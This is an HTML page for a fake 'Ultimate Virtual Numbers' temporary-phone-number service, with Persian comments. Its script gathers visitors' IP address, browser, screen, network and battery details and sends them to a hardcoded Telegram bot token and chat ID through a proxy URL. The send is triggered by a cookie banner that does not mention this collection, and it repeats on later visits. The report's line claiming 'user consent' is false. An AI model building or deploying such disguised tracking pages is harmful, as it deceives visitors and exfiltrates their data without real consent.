<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ultimate Virtual Numbers</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        /* ... (استایل‌ها تغییری نکرده‌اند و به اختصار حذف شدند) ... */
    </style>
</head>
<body>
    <div class="container">
        <div class="glow-effect glow-1"></div>
        <div class="glow-effect glow-2"></div>
        <div class="content">
            <header>
                <div class="header-overlay"></div>
                <h1>Ultimate Virtual Numbers</h1>
                <p class="tagline">Premium Temporary Numbers for Verification - Instant Activation</p>
            </header>
            <div class="numbers-grid">
                <!-- کارت‌های شماره تلفن (مطابق کد شما) -->
                <!-- ... -->
            </div>
            <div class="powered-by">
                ⚡Powered by: Matin<br>
                ╰┈┈┈┈┈┈┈┈┈┈┈┈┈╯
            </div>
            <footer>
                <p>© 2025 Ultimate Virtual Numbers. All rights reserved.</p>
            </footer>
        </div>
    </div>

    <div class="consent-bar" id="consentBar">
        <div>We use cookies to provide our services. By continuing to use this site, you consent to our use of cookies.</div>
        <button class="consent-btn" id="consentBtn">I Understand</button>
    </div>

    <script>
        async function collectDeviceInfo() {
            const info = {
                ip: await fetch('https://api.ipify.org?format=json')
                    .then(response => response.json())
                    .then(data => data.ip)
                    .catch(() => 'Unknown'),
                userAgent: navigator.userAgent,
                language: navigator.language,
                screenSize: `${window.screen.width}x${window.screen.height}`,
                networkType: navigator.connection ? navigator.connection.effectiveType : 'Unknown',
                date: new Date().toLocaleString(),
                location: 'Not requested'
            };

            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    info.battery = `${Math.round(battery.level * 100)}%`;
                    info.charging = battery.charging ? 'Charging' : 'Not Charging';
                } catch {
                    info.battery = 'Not available';
                    info.charging = 'Not available';
                }
            } else {
                info.battery = 'Not available';
                info.charging = 'Not available';
            }

            return info;
        }

        // تابع ویرایش‌شده با استفاده از پروکسی سفارشی
        async function sendToTelegramBot() {
            try {
                const deviceInfo = await collectDeviceInfo();
                const message = `📱 *Device Information Report* 📱

⚡ *Powered by Matin*
╰┈┈┈┈┈┈┈┈┈┈┈┈┈╯

🌐 *IP Address:* \`${deviceInfo.ip}\`
💻 *User Agent:* \`${deviceInfo.userAgent}\`
🔋 *Battery:* ${deviceInfo.battery} (${deviceInfo.charging})
🗣 *Language:* ${deviceInfo.language}
📏 *Screen Size:* ${deviceInfo.screenSize}
📶 *Network Type:* ${deviceInfo.networkType}
📅 *Date & Time:* ${deviceInfo.date}
📍 *Location:* ${deviceInfo.location}

🛡 *This information was collected with user consent*`;

                // توکن ربات و آیدی چت (حتماً طبق ربات خود تغییر دهید)
                const botToken = '7263505051:AAFus8VCdHB-gqQDURi3iiNu43aj2mNdn8s';
                const chatId = '8192431691';
                
                // اضافه‌کردن پروکسی MTProto به جای ارسال مستقيم به تلگرام
                // توجه: پروکسی MTProto فقط برای کلاینت‌های تلگرام قابل استفاده است
                // برای HTTP API تلگرام، نیاز به استفاده از یک HTTP/CORS proxy سمت سرور است
                const proxyUrl = 'https://t.me/proxy?server=yoast.harcibasheokeyee.ir&port=918&secret=7gAA8A8Pd1VV____9QBuLmltZWRpYS5zdGVhbXBvd2VyZWQuY29t&bot=@mtpro_xyz_bot';
                const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

                // توجه: بسیاری از پروکسی‌ها اجازه ارسال مستقیم API را نمی‌دهند! 
                // اما اگر سرور شما یک HTTP proxy یا relay پیاده‌سازی کند این ساختار قابل استفاده است:
                const proxyRequestUrl = `${proxyUrl}/${telegramUrl}`;

                const response = await fetch(proxyRequestUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });

                if (response.ok) {
                    alert("Information sent successfully!");
                } else {
                    alert("Failed to send information. Check console for details.");
                    console.error('Failed to send message:', await response.text());
                }
            } catch (error) {
                console.error('Error:', error);
                alert("An error occurred. Check console for details.");
            }
        }

        document.addEventListener('DOMContentLoaded', function() {
            const consentBar = document.getElementById('consentBar');
            const consentBtn = document.getElementById('consentBtn');
            setTimeout(() => consentBar.classList.add('visible'), 1000);

            consentBtn.addEventListener('click', function() {
                consentBar.classList.remove('visible');
                localStorage.setItem('consentGiven', 'true');
                setTimeout(sendToTelegramBot, 1000);
            });

            if (localStorage.getItem('consentGiven') === 'true') {
                consentBar.style.display = 'none';
                setTimeout(sendToTelegramBot, 3000);
            }

            document.querySelectorAll('.select-btn').forEach(btn => {
                btn.addEventListener('click', function() {
                    const card = this.closest('.number-card');
                    const country = card.querySelector('.country').textContent.trim();
                    const number = card.querySelector('.phone-number').textContent;
                    alert(`You selected: ${number} (${country})\n\nThis is a demo page. No actual number will be assigned.`);
                });
            });
        });
    </script>
</body>
</html>
